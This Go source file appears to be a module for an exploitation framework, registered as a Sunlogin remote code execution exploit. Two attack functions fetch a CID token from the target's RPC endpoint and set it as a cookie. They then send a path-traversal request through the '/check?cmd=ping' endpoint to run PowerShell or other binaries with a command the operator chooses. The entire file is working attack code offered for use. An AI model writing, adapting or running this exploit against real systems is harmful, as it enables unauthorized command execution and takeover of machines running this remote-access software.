package exp_sunlogin

import (
	"encoding/json"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"

	"net/url"
)

type Exp_SunloginRCE struct {
	exp_templates.ExpTemplate
}

type jsonResult struct {
	Code_        int    `json:"__code"`
	Enabled      string `json:"enabled"`
	VerifyString string `json:"verify_string"`
	Code         int    `json:"code"`
}

func (self *Exp_SunloginRCE) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
	// 获取cid
	httpresp := self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/cgi-bin/rpc?action=verify-haras"), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	jr := new(jsonResult)

	err := json.Unmarshal([]byte(httpresp.Body), jr)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	self.EchoSuccessMsg("获取CID成功，CID=" + jr.VerifyString)
	headers.Set("Cookie", "CID="+jr.VerifyString)

	execUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+"+url.QueryEscape(self.MustGetStringParam("cmd")))
	httpresp = self.HttpGet(execUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp

	expResult.Result = httpresp.Body
	return
}

func (self *Exp_SunloginRCE) Attack_cmd2() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()
	// 获取cid
	httpresp := self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/cgi-bin/rpc?action=verify-haras"), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	jr := new(jsonResult)

	err := json.Unmarshal([]byte(httpresp.Body), jr)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	self.EchoSuccessMsg("获取CID成功，CID=" + jr.VerifyString)
	headers.Set("Cookie", "CID="+jr.VerifyString)

	cmd = strings.ReplaceAll(cmd, "\\", "/")
	execUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F"+url.QueryEscape(cmd))
	httpresp = self.HttpGet(execUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp

	expResult.Result = httpresp.Body
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_SunloginRCE{}, "exp_RCE1.yml")

}
